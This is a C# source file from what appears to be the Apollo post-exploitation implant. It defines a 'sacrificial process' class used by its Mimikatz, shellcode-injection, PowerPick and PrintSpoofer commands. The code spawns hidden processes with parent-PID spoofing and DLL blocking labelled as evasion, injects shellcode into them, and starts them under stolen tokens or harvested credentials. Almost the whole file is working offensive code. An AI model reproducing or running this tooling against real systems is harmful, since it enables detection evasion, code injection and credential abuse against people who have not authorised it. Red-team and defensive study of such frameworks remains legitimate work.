﻿#define COMMAND_NAME_UPPER

#if DEBUG
#undef MIMIKATZ
#undef RUN
#undef SHELL
#undef POWERPICK
#undef PSINJECT
#undef EXECUTE_ASSEMBLY
#undef ASSEMBLY_INJECT
#undef PRINTSPOOFER
#undef SPAWN
#undef SHINJECT
#define MIMIKATZ
#define RUN
#define SHELL
#define POWERPICK
#define PSINJECT
#define EXECUTE_ASSEMBLY
#define ASSEMBLY_INJECT
#define SHINJECT
#define PRINTSPOOFER
#define SPAWN
#endif

#if MIMIKATZ || RUN || SHELL || POWERPICK || PSINJECT || EXECUTE_ASSEMBLY || ASSEMBLY_INJECT || SHINJECT || SPAWN || PRINTSPOOFER

using System;
using System.ComponentModel;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Apollo.Injection;
using static Utils.DebugUtils;
using System.Text;
using System.Threading;
using Microsoft.Win32.SafeHandles;
using System.Collections.Generic;
using System.Security.Principal;
using Apollo.CommandModules;
using Apollo.Credentials;
using static Native.Constants;
using static Native.Enums;
using static Native.Structures;
using static Native.Methods;
using System.Diagnostics;
using Native;

namespace Apollo.SacrificialProcesses
{
    internal class SacrificialProcess
    {
        internal string command { get; private set; }
        private ProcessInformation processInfo = new ProcessInformation();
        private StartupInfo startupInfo = new StartupInfo();
        private StartupInfoEx startupInfoEx = new StartupInfoEx();
        private CreateProcessFlags processFlags = CreateProcessFlags.CREATE_UNICODE_ENVIRONMENT;
        private SecurityAttributes securityAttributes = new SecurityAttributes();
        private readonly ManualResetEvent exited = new ManualResetEvent(false);
        public bool HasExited { get; private set; }
        public int ExitCode { get; private set; }
        public uint PID { get; private set; }
        private SafeFileHandle _hParentProc = null;
        public SafeFileHandle Handle { get; private set; }
        public event EventHandler Exited;

        public string StdOut { get; private set; } = "";
        public string StdError { get; private set; } = "";

        public delegate void dataReceivedDelegate(string data);
        
        public dataReceivedDelegate OutputDataReceived = delegate (string data) { Console.Write(data); };
        public dataReceivedDelegate ErrorDataReceived = delegate (string data) { Console.Write(data); };


        public TextReader StandardOutput { get; private set; }
        public TextReader StandardError { get; private set; }
        public TextWriter StandardInput { get; private set; }

        private bool suspend;

        private SafeFileHandle hReadOut, hWriteOut, hReadErr, hWriteErr, hReadIn, hWriteIn, hDupWriteOut = new SafeFileHandle(IntPtr.Zero, true), hDupWriteErr = new SafeFileHandle(IntPtr.Zero, true);
        private IntPtr unmanagedEnv;

        private bool Initialize(IntPtr hToken)
        {
            bool bRet = false;
            securityAttributes.bInheritHandle = true;
            bRet = InitializeSecurityDescriptor(out SECURITY_DESCRIPTOR sd, 1);
            bRet = SetSecurityDescriptorDacl(ref sd, true, IntPtr.Zero, false);
            IntPtr pSd = Marshal.AllocHGlobal(Marshal.SizeOf(sd));
            Marshal.StructureToPtr(sd, pSd, false);
            securityAttributes.lpSecurityDescriptor = pSd;
            bRet = CreatePipe(out hReadOut, out hWriteOut, securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = CreatePipe(out hReadErr, out hWriteErr, securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = CreatePipe(out hReadIn, out hWriteIn, securityAttributes, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            bRet = SetHandleInformation(hReadOut, HANDLE_FLAG_INHERIT, 0);
            if (!bRet)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            IntPtr hDupStdOutWrite;

            if (!CreateEnvironmentBlock(out unmanagedEnv, hToken, false))
            {
                unmanagedEnv = IntPtr.Zero;
                //int lastError = Marshal.GetLastWin32Error();
                //throw new Win32Exception(lastError, "Error calling CreateEnvironmentBlock: " + lastError);
            }

            if (suspend)
                processFlags |= CreateProcessFlags.CREATE_SUSPENDED;
            
            // Create process
            startupInfo.cb = Marshal.SizeOf(startupInfoEx);
            startupInfo.dwFlags = STARTF.STARTF_USESTDHANDLES | STARTF.STARTF_USESHOWWINDOW;
            // Wonder if this interferes with stdout?
            startupInfo.wShowWindow = 0;

            var evasionArgs = Evasion.EvasionManager.GetSacrificialProcessStartupInformation();
            // bad things happen if you're medium integrity and do ppid spoofing while under the effects of make_token
            if (CredentialManager.OriginalIdentity != CredentialManager.CurrentIdentity)
            {
                evasionArgs.ParentProcessId = System.Diagnostics.Process.GetCurrentProcess().Id;
            }

            _hParentProc = new SafeFileHandle(OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId), false);
            
            if (_hParentProc.IsInvalid)
            {
                using (CredentialManager.OriginalIdentity.Impersonate())
                    _hParentProc = new SafeFileHandle(OpenProcess(ProcessAccessFlags.MAXIMUM_ALLOWED, false, evasionArgs.ParentProcessId), false);
            }
            if (!_hParentProc.IsInvalid)
            {
                IntPtr lpVal = Marshal.AllocHGlobal(IntPtr.Size);
                IntPtr lpSize = IntPtr.Zero;

                Marshal.WriteIntPtr(lpVal, _hParentProc.DangerousGetHandle());
                int dwAttributeCount = evasionArgs.BlockDlls ? 2 : 1;
                var result1 = InitializeProcThreadAttributeList(IntPtr.Zero, dwAttributeCount, 0, ref lpSize);
                startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                if (bRet = InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, dwAttributeCount, 0, ref lpSize))
                {

                    // BlockDLLs
                    if (evasionArgs.BlockDlls)
                    {
                        var lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);

                        Marshal.WriteInt64(
                            lpMitigationPolicy,
                            PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
                            );

                        bRet = UpdateProcThreadAttribute(
                            startupInfoEx.lpAttributeList,
                            0,
                            (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                            lpMitigationPolicy,
                            (IntPtr)IntPtr.Size,
                            IntPtr.Zero,
                            IntPtr.Zero
                            );
                    }

                    if (bRet = UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpVal,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero))
                    {
                        try
                        {
                            bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                hWriteOut,
                                _hParentProc,
                                ref hDupWriteOut,
                                0,
                                true,
                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                            bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                hWriteErr,
                                _hParentProc,
                                ref hDupWriteErr,
                                0,
                                true,
                                DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                        } catch (Exception ex)
                        {
                            try
                            {
                                using (CredentialManager.OriginalIdentity.Impersonate())
                                {
                                    bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                        hWriteOut,
                                        _hParentProc,
                                        ref hDupWriteOut,
                                        0,
                                        true,
                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                                    bRet = DuplicateHandle(System.Diagnostics.Process.GetCurrentProcess().Handle,
                                        hWriteErr,
                                        _hParentProc,
                                        ref hDupWriteErr,
                                        0,
                                        true,
                                        DuplicateOptions.DuplicateCloseSource | DuplicateOptions.DuplicateSameAccess);
                                }
                            } catch (Exception ex2)
                            {
                                bRet = false;
                            }
                        }
                        if (bRet)
                        {
                            startupInfo.hStdOutput = hDupWriteOut;
                            startupInfo.hStdError = hDupWriteErr;
                            startupInfo.hStdInput = hReadIn;
                            startupInfoEx.StartupInfo = startupInfo;
                            bRet = true;
                        }
                    }
                    else
                    {
                        bRet = false;
                    }
                }
                else
                {
                    bRet = false;
                }
                if (!bRet)
                {
                    Marshal.FreeHGlobal(lpVal);
                }
            } else
            {
                bRet = false;
            }
           
            return bRet;
        }

        public SacrificialProcess(string lpApplicationName, bool startSuspended=false)
        {
            command = lpApplicationName;
            suspend = startSuspended;
        }

        public SacrificialProcess(string lpApplicationName, string lpArguments, bool startSuspended = false)
        {
            command = $"{lpApplicationName} {lpArguments}";
            suspend = startSuspended;
        }

        public bool Inject(byte[] pic, string arguments = "")
        {
            bool bRet = false;
            if (processInfo.hProcess == IntPtr.Zero)
                return bRet;
            if (HasExited)
                return bRet;
            try
            {
                var technique = (InjectionTechnique)Activator.CreateInstance(InjectionTechnique.GetInjectionTechnique(), new object[] { pic, (uint)processInfo.dwProcessId });
                bRet = technique.Inject(arguments);
            }
            catch (Exception ex)
            {
                DebugWriteLine($"ERROR! Could not inject shellcode of length {pic.Length} into process PID {processInfo.dwProcessId} using {InjectionTechnique.GetInjectionTechnique().Name}.\n\tReason: {ex.Message}\n\tStackTrace: {ex.StackTrace}");
                bRet = false;
            }
            return bRet;
        }

        public void WaitForExit()
        {
            WaitForExit(-1);
            HasExited = true;
            if (Exited != null) Exited(this, EventArgs.Empty);
            int dwExit = 0;
            bool bRet = GetExitCodeProcess(processInfo.hProcess, out dwExit);
            if (bRet)
                ExitCode = dwExit;
            else
                ExitCode = Marshal.GetLastWin32Error();
        }

        public bool WaitForExit(int milliseconds)
        {
            return exited.WaitOne(milliseconds);
        }


        public bool Start()
        {
            if (CredentialManager.GetImpersonatedPrimaryToken(out IntPtr hOutToken))
            {
                SafeFileHandle hToken = new SafeFileHandle(hOutToken, false);
                return Start(hToken);
            }
            else
            {
                var bRet = false;


                bRet = Initialize(WindowsIdentity.GetCurrent().Token);
                if (bRet)
                {
                    bRet = CreateProcessA(
                        null,
                        command,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        true,
                        processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                        unmanagedEnv,
                        null,
                        ref startupInfoEx,
                        out processInfo);
                    if (!bRet)
                        throw new Win32Exception(Marshal.GetLastWin32Error());
                }


                if (!bRet)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                Handle = new SafeFileHandle(processInfo.hProcess, true);
                PID = (uint)processInfo.dwProcessId;
                StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
                StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
                StandardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);

                if (PID != 0)
                    WaitForExitAsync();

                return bRet;
            }
        }

        public bool Start(Credential cred)
        {
            bool bRet = false;

            SafeFileHandle hToken;

            // Logon user
            bRet = LogonUser(
                cred.Username,
                cred.Domain,
                cred.Password,
                LogonType.LOGON32_LOGON_NEW_CREDENTIALS,
                LogonProvider.LOGON32_PROVIDER_WINNT50,
                out hToken
            );
            if (!bRet)
                return bRet;
            //bRet = DuplicateTokenEx(
            //    hToken.DangerousGetHandle(),
            //    TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query | TokenAccessLevels.Duplicate,
            //    IntPtr.Zero,
            //    TokenImpersonationLevel.Impersonation,
            //    TOKEN_TYPE.TokenPrimary,
            //    out IntPtr dupToken);
            //var temp = new SafeFileHandle(dupToken, false);
            //bRet = CredentialManager.SePrivEnable(hToken.DangerousGetHandle(), "SeAssignPrimaryTokenPrivilege");
            //if (!bRet)
            //    return bRet;
            //bRet = CredentialManager.SePrivEnable(hToken.DangerousGetHandle(), "SeIncreaseQuotaPrivilege");
            if (!bRet)
                return bRet;
            return Start(hToken);
        }




        public bool Start(SafeFileHandle hToken)
        {
            int dwError;
            var success = false;
            success = Initialize(hToken.DangerousGetHandle());
            if (!success)
                return success;

            //success = DuplicateTokenEx(
            //    hToken.DangerousGetHandle(),
            //    TokenAccessLevels.Query | TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary,
            //    new SECURITY_ATTRIBUTES()
            //    {
            //        bInheritHandle = true
            //    },
            //    TokenImpersonationLevel.Impersonation,
            //    TOKEN_TYPE.TokenPrimary,
            //    out IntPtr dupToken);

            //if (!success)
            //    return success;

            //success = ImpersonateLoggedOnUser(hToken.DangerousGetHandle());
            //if (!success)
            //    return success;
            
            success = CreateProcessAsUser(
                hToken,
                null,
                command,
                IntPtr.Zero,
                IntPtr.Zero,
                true,
                processFlags | CreateProcessFlags.EXTENDED_STARTUPINFO_PRESENT,
                unmanagedEnv,
                null,
                ref startupInfoEx,
                out processInfo
            );
            dwError = Marshal.GetLastWin32Error();
            if (!success && dwError == Win32Error.ERROR_PRIVILEGE_NOT_HELD)
            {
                success = CreateProcessWithTokenW(
                    hToken,
                    LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                    null,
                    command,
                    processFlags,
                    unmanagedEnv,
                    null,
                    ref startupInfoEx,
                    out processInfo);

                dwError = Marshal.GetLastWin32Error();

                if (!success && dwError == Win32Error.ERROR_PRIVILEGE_NOT_HELD)
                {
                    if (CredentialManager.GetCredential(out Credential cred))
                    {
                        success = CreateProcessWithLogonW(
                            cred.Username,
                            cred.Domain,
                            cred.Password,
                            LogonFlags.LOGON_NETCREDENTIALS_ONLY,
                            null,
                            command,
                            processFlags,
                            unmanagedEnv,
                            null,
                            ref startupInfoEx,
                            out processInfo);
                        dwError = Marshal.GetLastWin32Error();
                    }
                }
            }

            if (!success)
                throw new Win32Exception(dwError);

            Handle = new SafeFileHandle(processInfo.hProcess, true);
            PID = (uint)processInfo.dwProcessId;
            StandardOutput = new StreamReader(new FileStream(hReadOut, FileAccess.Read), Console.OutputEncoding);
            StandardError = new StreamReader(new FileStream(hReadErr, FileAccess.Read), Console.OutputEncoding);
            StandardInput = new StreamWriter(new FileStream(hWriteIn, FileAccess.Write), Console.InputEncoding);
            if (PID != 0)
                WaitForExitAsync();

            return success;
        }

        private IEnumerable<string> ReadStream(TextReader stream, dataReceivedDelegate del)
        {
            string output = "";
            int szBuffer = 4096;
            int bytesRead = 0;
            char[] tmp;
            bool needsBreak = false;
            Thread t = new Thread(() =>
            {
                exited.WaitOne();
                needsBreak = true;
            });
            t.Start();
            while (!needsBreak)
            {
                char[] buf = new char[szBuffer];
                try
                {
                    bytesRead = stream.Read(buf, 0, szBuffer);
                } catch { bytesRead = 0; }

                if (bytesRead > 0)
                {
                    tmp = new char[bytesRead];
                    Array.Copy(buf, tmp, bytesRead);
                    output = new string(tmp);
                    yield return output;
                    if (del != null)
                    {
                        try
                        {
                            del(output);
                        }
                        catch { }
                    }
                }
                //System.Threading.Thread.Sleep(1000);
            }
            output = "";
            try
            {
                output = stream.ReadToEnd();
            }
            catch { }
            if (!string.IsNullOrEmpty(output))
            {
                yield return output;
                if (del != null)
                    try { del(output); } catch { }
            }

        }

        private Thread GetStdOutAsync()
        {
            Thread t = new Thread(() =>
            {
                foreach(string s in ReadStream(StandardOutput, OutputDataReceived))
                {
                    StdOut += s;
                }
            });
            return t;
        }

        private Thread GetStdErrorAsync()
        {
            Thread t = new Thread(() =>
            {
                foreach (string s in ReadStream(StandardError, ErrorDataReceived))
                {
                    StdError += s;
                }
            });
            return t;
        }


        public IEnumerable<string> GetOutput()
        {
            int stdOutIndex = 0;
            int stdErrorIndex = 0;
            int BUF_SIZE = 4096;
            string output = "";
            while (!HasExited)
            {
                char[] buf = new char[BUF_SIZE];
                if (StandardOutput.Peek() > -1)
                {
                    stdOutIndex += StandardOutput.Read(buf, stdOutIndex, BUF_SIZE);
                    output = (new string(buf)).Trim();
                }
                else if (StandardError.Peek() > -1)
                {
                    stdErrorIndex += StandardError.Read(buf, stdErrorIndex, BUF_SIZE);
                    output = (new string(buf)).Trim();
                }
                else
                {
                    output = "";
                }
                if (!string.IsNullOrEmpty(output))
                    yield return output;
            }

            output = (StandardOutput.ReadToEnd().Trim() + "\r\n" + StandardError.ReadToEnd().Trim()).Trim();
            //Console.WriteLine($"Final output: {output}");
            if (!string.IsNullOrEmpty(output))
                yield return output;
        }

        private void WaitForExitAsync()
        {
            var thr = new Thread(() =>
            {
                var stdOutThread = GetStdOutAsync();
                var stdErrThread = GetStdErrorAsync();
                stdOutThread.Start();
                stdErrThread.Start();
                WaitForSingleObject(processInfo.hProcess, INFINITE);
                exited.Set();
                stdOutThread.Join();
                stdErrThread.Join();
                HasExited = true;
                if (Exited != null) Exited(this, EventArgs.Empty);
                int dwExit = 0;
                bool bRet = GetExitCodeProcess(processInfo.hProcess, out dwExit);
                if (bRet)
                    ExitCode = dwExit;
                else
                    ExitCode = Marshal.GetLastWin32Error();
                startupInfo.hStdOutput.Close();
                startupInfo.hStdError.Close();
                startupInfo.hStdInput.Close();
                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                }
                DestroyEnvironmentBlock(unmanagedEnv);
            });
            thr.Start();
        }

        public void Kill()
        {
            try
            {
                System.Diagnostics.Process.GetProcessById((int)PID).Kill();
            }
            catch
            {

            }
        }
    }
}
#endif